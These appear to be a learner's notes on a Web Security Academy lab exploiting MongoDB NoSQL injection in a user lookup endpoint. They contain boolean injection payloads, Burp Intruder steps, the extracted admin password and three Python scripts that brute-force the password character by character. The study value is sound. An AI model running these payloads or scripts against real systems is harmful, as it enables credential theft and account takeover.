The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, extract the password for the `administrator` user, then log in to their account.

You can log in to your own account using the following credentials: `wiener:peter`.

_Tip: the password only uses lowercase letters._

---

**Goal:** Extract the password for the `administrator` user, then log in to their account.

Login post request:

![[IMG/Pasted image 20240919112731.png]]

`csrf=X1U2BcHazmR2IMhHbe6dqh6WUsxgR2mL&username=administrator&password=test`

- In Burp, go to **Proxy > HTTP history**. Right-click the `GET /user/lookup?user=wiener` request and select **Send to Repeater**.
    
- In Repeater, submit a `'` character in the user parameter. Notice that this causes an error. This may indicate that the user input was not filtered or sanitized correctly.
    
- Submit a valid JavaScript payload in the `user` parameter. For example, you could use `wiener'+'`
    
    Make sure to URL-encode the payload by highlighting it and using the hotkey `Ctrl-U`. Notice that it retrieves the account details for the `wiener` user, which indicates that a form of server-side injection may be occurring.
    
- Identify whether you can inject boolean conditions to change the response:
    
    1. Submit a false condition in the `user` parameter. For example: `wiener' && '1'=='2`
        
        Make sure to URL-encode the payload. Notice that it retrieves the message `Could not find user`.
        
    2. Submit a true condition in the user parameter. For example: `wiener' && '1'=='1`
        
        Make sure to URL-encode the payload. Notice that it no longer causes an error. Instead, it retrieves the account details for the `wiener` user. This demonstrates that you can trigger different responses for true and false conditions

- Identify the password length:
    
    1. Change the user parameter to `administrator' && this.password.length < 30 || 'a'=='b`, then send the request.
        
        Make sure to URL-encode the payload. Notice that the response retrieves the account details for the `administrator` user. This indicates that the condition is true because the password is less than 30 characters.
        
    2. Reduce the password length in the payload, then resend the request.
    3. Continue to try different lengths.
    4. Notice that when you submit the value `9`, you retrieve the account details for the `administrator` user, but when you submit the value `8`, you receive an error message because the condition is false. This indicates that the password is 8 characters long.

- In Intruder, enumerate the password:
    
    1. Change the user parameter to `administrator' && this.password[§0§]=='§a§`. This includes two payload positions. Make sure to URL-encode the payload.
    2. Set the attack type to **Cluster bomb**.
    3. In the **Payloads** tab, make sure that **Payload set 1** is selected, then add numbers from 0 to 7 for each character of the password.
    4. Select **Payload set 2**, then add lowercase letters from a to z. If you're using Burp Suite Professional, you can use the built-in `a-z` list.
    5. Click **Start attack**.
    6. Sort the attack results by **Payload 1**, then **Length**. Notice that one request for each character position (0 to 7) has evaluated to true and retrieved the details for the `administrator` user. Note the letters from the **Payload 2** column down.



![[IMG/Pasted image 20240920113040.png]]

![[IMG/Pasted image 20240920114747.png]]

pass: cinhevnu

---

Script details

pass length 8

32/126

payload:

```php
administrator' && this.password[§0§]=='§a§
```

```php
administrator'+&&+this.password[1]=='1
```

```php
%3fuser%3dadministrator'+%26%26+this.password[1]%3d%3d'a 
```

Post /login

needs session and csrf token.

error messages for brute-force

`Could not find user`

`"username": "administrator",
  `"email": "admin@normal-user.net",`
  `"role": "administrator"`

reply content length `38` and `96`

---

**Extra**

_Resources:_ https://www.youtube.com/watch?v=uk7txgw5OHc

I'm not sure this is needed, it looks like the server should accept the numbers as letters, but i need to look this up further. 

_sql has an ascii function which is probably what the original code was doing to get letters to attack the password with. Specifically this line: `sqli_payload_encoded = urllib.parse.quote(payload)`_

So maybe if i clean up the payload and send the below code through with actual lowercase letters and not numbers the exploit might work.

Looking at the found script it also uses string so this is probably what is wrong.
`from string import ascii_letters`

I can just import lowercase though as the lab description reveals this info to the student.

![[IMG/Pasted image 20240920133009.png]]

---

**Script:**

Working exploit, but needs cleaning up.

```php
#!/usr/bin/python3

import urllib3
import sys
import requests
from bs4 import BeautifulSoup 
import string 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'https': 'http://127.0.0.1:8080', 'http': 'http://127.0.0.1:8080'}

# Get csrf
def get_csrf(s, url):
	r = s.get(url + 'login', verify=False, proxies=proxies)
	soup = BeautifulSoup(r.text, 'html.parser')
	csrf = soup.find("input")['value']
	return csrf

# Login user    
def login_user(s, url):
	csrf = get_csrf(s, url)	
	username = 'wiener'
	password = 'peter'
	logindata = {
		'csrf': csrf,
		'username': username,
		'password': password
	}
	print('[+] Logging into the web application.')
	
	r = s.post(url + 'login', data=logindata, verify=False, proxies=proxies)
	#print(r.text)
	if 'wiener' in r.text:
		print('[+] Successfully logged into the account.')
		get_pass(s, url)
		
	else:
		print('[-] Could not log into the user account....')
		sys.exit(-1)
		
# Obtain admin pass	
def get_pass(s, url):
	password_extracted = ''
	user_lookup = url + 'user/lookup'
	print("[+] Trying to obtain the admin password: \n")
	for i in range(0,8):
	# ascii table
		for j in string.ascii_lowercase:
			payload = f"?user=administrator'+%26%26+this.password[{i}]%3d%3d'{j}" 		
			r = s.get(user_lookup + payload, verify=False, proxies=proxies)			
			if '"role": "administrator"' in r.text:
				password_extracted += j
				sys.stdout.write('\r' + password_extracted)
				sys.stdout.flush()
				break # Break out of the for loop and move to the next
	
			else:
				sys.stdout.write('\r' + password_extracted + j)
				sys.stdout.flush()

	
# Print user help    
def main():
	if len(sys.argv) != 2:
		print("[+] Usage: %s <URL>" % sys.argv[0])
		print("[+] Example: %s www.example.com/" % sys.argv[0])
		sys.exit(-1)
		
	url = sys.argv[1]
	s = requests.Session()
	print("[+] Trying to get password...")
	login_user(s, url)

if __name__ == '__main__':
	main()	
```

Things learned:

- I didn't use urllib and used string instead as i suspected.
- Test payloads in burp to make sure things work okay. 
- Start the count at zero not one. Should be obvious by now.

Test:

```php
#!/usr/bin/python3

import urllib3
import sys
import requests
import urllib
from bs4 import BeautifulSoup 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'https': 'http://127.0.0.1:8080', 'http': 'http://127.0.0.1:8080'}

# Get csrf
def get_csrf(s, url):
	r = s.get(url + 'login', verify=False, proxies=proxies)
	soup = BeautifulSoup(r.text, 'html.parser')
	csrf = soup.find("input")['value']
	return csrf

# Login user    
def login_user(s, url):
	csrf = get_csrf(s, url)
	#login_url = url + '/login'
	#print(csrf)
	
	#----working----#

	username = 'wiener'
	password = 'peter'
	logindata = {
		'csrf': csrf,
		'username': username,
		'password': password
	}
	print('[+] Logging into the web application.')
	
	r = s.post(url + 'login', data=logindata, verify=False, proxies=proxies)
	#print(r.text)
	if 'wiener' in r.text:
		print('[+] Successfully logged into the account.')
		get_pass(s, url)
		
	else:
		print('[-] Could not log into the user account....')
		sys.exit(-1)
		
	#----test----#

def get_pass(s, url):
	password_extracted = ''
	user_lookup = url + '/user/lookup'
	for i in range(1,9):
	# ascii table
		for j in range(32,126):
			payload = "administrator' && this.password[%s]=='%s" %(i,j)
			#csrf = 
			#cookies =
			sqli_payload_encoded = urllib.parse.quote(payload)
			
			r = s.get(user_lookup, verify=False, proxies=proxies)
	
			
			if 'Could not find user' in r.text:
				password_extracted += chr(j)
				sys.stdout.write('\r' + password_extracted)
				sys.stdout.flush()
				break # Break out of the for loop and move to the next
	
			else:
				sys.stdout.write('\r' + password_extracted + chr(j))
				sys.stdout.flush()
	
	
	
		#----test----#
	
    
# Print user help    
def main():
	if len(sys.argv) != 2:
		print("[+] Usage: %s <URL>" % sys.argv[0])
		print("[+] Example: %s www.example.com/" % sys.argv[0])
		sys.exit(-1)
		
	url = sys.argv[1]
	s = requests.Session()
	print("[+] Trying to get password...")
	login_user(s, url)

if __name__ == '__main__':
	main()

```

- Payload needs more work. It's unable to process the request.

Found script

```python
import requests
from bs4 import BeautifulSoup
from string import ascii_letters

class Exploit:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.session = requests.Session()

    def getCSRFToken(self):
        print('[*] Fetching the CSRF token...')
        global LOGIN_ENDPOINT
        LOGIN_ENDPOINT = '/login'
        csrfTokenRespond = self.session.get(f'{self.baseUrl}{LOGIN_ENDPOINT}')
        
        soup = BeautifulSoup(csrfTokenRespond.text, 'html.parser')
        csrfToken = soup.find('input', {'name':'csrf'}).get('value')
        sessionCookie = self.session.cookies.get_dict()['session']
        print(f'[+] Fetched the CSRF token: {csrfToken}')
        print(f'[+] Session cookie: {sessionCookie}')
        return csrfToken

    def login(self):
        csrfToken = self.getCSRFToken()
        username = 'wiener'
        password = 'peter'
        loginData = {
            'csrf': csrfToken,
            'username': username,
            'password': password
        }
        print('[*] Logging in to the web application...')
        loginRespond = self.session.post(f'{self.baseUrl}{LOGIN_ENDPOINT}', data=loginData)
        if loginRespond.status_code == 400:
            print('[-] Login failed... Maybe the CSRF token is incorrect?')
            print(f'[-] Response text:\n{loginRespond.text}')
            exit(1)
        print('[+] Login successfully!')

    def extractData(self):
        USER_LOOKUP_ENDPOINT = '/user/lookup'
        USER_LOOK_PARAMETER = 'user'
        TARGET_USERNAME = 'administrator'
        LAST_CHARACTER = ascii_letters[-1]
        print(f'[*] Extracting {TARGET_USERNAME}\'s password...')
        password = ''
        stringPosition = 0
        while True:
            for character in ascii_letters:
                print(f'[*] Trying character "{character}"...', end='\r')
                payload = requests.utils.quote(f"{TARGET_USERNAME}' && this.password[{stringPosition}] == '{character}' || 'a'=='b")
                userLookupRespond = self.session.get(f'{self.baseUrl}{USER_LOOKUP_ENDPOINT}?{USER_LOOK_PARAMETER}={payload}')
                userLookupRespondJson = userLookupRespond.json()
                isLastCharacter = character == LAST_CHARACTER
                if 'message' in userLookupRespondJson:
                    if isLastCharacter:
                        print('[-] Looped all possible characters, no luck. Maybe we found all the password characters?')
                        print(f'[*] Password: {password}')
                        exit(1)
                    continue
                stringPosition += 1
                password += character
                print(f'[+] Found correct character "{character}". Current password: {password}')
                break

if __name__ == '__main__':
    baseUrl = 'https://0ade00e60326fdd58cade324003900c8.web-security-academy.net'
    exploit = Exploit(baseUrl)

    exploit.login()
    exploit.extractData()

```